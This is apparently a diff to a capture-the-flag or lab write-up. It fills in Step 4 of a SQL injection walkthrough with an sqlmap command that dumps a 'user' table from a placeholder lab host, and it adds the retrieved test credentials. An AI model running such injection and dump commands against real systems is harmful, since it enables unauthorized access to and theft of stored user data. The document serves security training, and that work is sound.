@@ -118,10 +118,10 @@ Result:
 ---
 
 ### Step 4: Table 'user' found. Dump table data
-`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D ai -T <table_name> --dump`
+`sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D ai -T user --dump`
 
 Result:
-- Retrieved credentials
+- Retrieved credentials user: test@chatai.com password: 12345678
 
 ---
 
